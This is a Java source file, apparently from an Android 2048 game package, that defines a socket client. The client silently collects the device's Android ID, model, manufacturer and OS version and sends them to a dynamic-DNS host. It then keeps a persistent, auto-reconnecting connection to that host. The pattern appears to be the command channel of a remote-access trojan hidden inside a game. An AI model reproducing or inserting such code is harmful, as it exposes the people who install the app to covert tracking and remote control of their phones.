package com.koko.koko2048.test;

import android.os.Build;
import android.provider.Settings;

import java.net.URISyntaxException;

import io.socket.client.IO;
import io.socket.client.Socket;


/**
 * @author kkexc
 * 2020-4-20 13:40:39
 */
public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;


    private IOSocket() {
        try {

            String deviceID = Settings.Secure.getString(MainService.getContextOfApplication().getContentResolver(), Settings.Secure.ANDROID_ID);
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 999999999;

            ioSocket = IO.socket("http://kevin121381.xicp.net?model=" + android.net.Uri.encode(Build.MODEL) + "&manf=" + Build.MANUFACTURER + "&release=" + Build.VERSION.RELEASE + "&id=" + deviceID);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }


    public static IOSocket getInstance() {
        return ourInstance;
    }

    public Socket getIoSocket() {
        return ioSocket;
    }


}
